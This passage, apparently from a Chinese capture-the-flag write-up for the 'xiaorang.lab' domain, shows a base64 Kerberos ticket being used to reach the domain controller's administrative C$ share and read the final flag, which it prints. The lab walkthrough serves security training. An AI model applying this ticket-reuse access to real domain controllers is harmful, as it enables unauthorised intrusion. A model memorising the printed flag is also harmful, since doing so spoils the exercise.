QU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
```

![image-20250317232613642](../assets/image-20250317232613642.png)

接下来就可以和DC进行通讯了

```
WIN+R
\\DC.xiaorang.lab\C$\Users\Administrator\flag\
```

![image-20250317233125339](../assets/image-20250317233125339.png)

或者

```
type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
```

```
 ######:                                               ###   ######:                             ##
 #######                         ##                   :###   #######                             ##
 ##   :##                        ##                  .####   ##   :##                            ##
 ##    ##   ##.####  ##    ##  #######    .####:     ##.##   ##    ##   .####.    :####     :###.##
 ##   :##   #######  ##    ##  #######   .######:   :#: ##   ##   :##  .######.   ######   :#######
 #######.   ###.     ##    ##    ##      ##:  :##  .##  ##   #######:  ###  ###   #:  :##  ###  ###
 #######.   ##       ##    ##    ##      ########  ##   ##   ######    ##.  .##    :#####  ##.  .##
 ##   :##   ##       ##    ##    ##      ########  ########  ##   ##.  ##    ##  .#######  ##    ##
 ##    ##   ##       ##    ##    ##      ##        ########  ##   ##   ##.  .##  ## .  ##  ##.  .##
 ##   :##   ##       ##:  ###    ##.     ###.  :#       ##   ##   :##  ###  ###  ##:  ###  ###  ###
 ########   ##        #######    #####   .#######       ##   ##    ##: .######.  ########  :#######
 ######     ##         ###.##    .####    .#####:       ##   ##    ###  .####.     ###.##   :###.##


Well done hacking!
This is the final flag, you deserve it!


flag04: flag{1c3cf693-f2fc-4f35-aece-789e66f56ecc}
```

